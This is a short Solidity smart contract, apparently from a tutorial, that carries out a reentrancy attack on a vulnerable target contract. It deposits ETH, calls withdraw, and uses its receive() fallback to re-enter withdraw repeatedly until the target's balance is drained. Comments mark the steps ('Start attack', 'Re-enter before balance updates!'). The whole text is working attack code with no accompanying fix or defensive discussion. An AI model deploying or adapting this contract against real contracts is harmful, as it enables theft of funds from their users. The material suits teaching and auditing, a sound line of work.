contract AttackReentrancy {
    ReentrancyVulnerable public target;

    constructor(address _target) {
        target = ReentrancyVulnerable(_target);
    }

    function attack() public payable {
        target.deposit{value: msg.value}(); // Deposit some ETH
        target.withdraw(); // Start attack
    }

    // 🛑 This fallback function executes when ETH is sent to this contract
    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(); // Re-enter before balance updates!
        }
    }
}
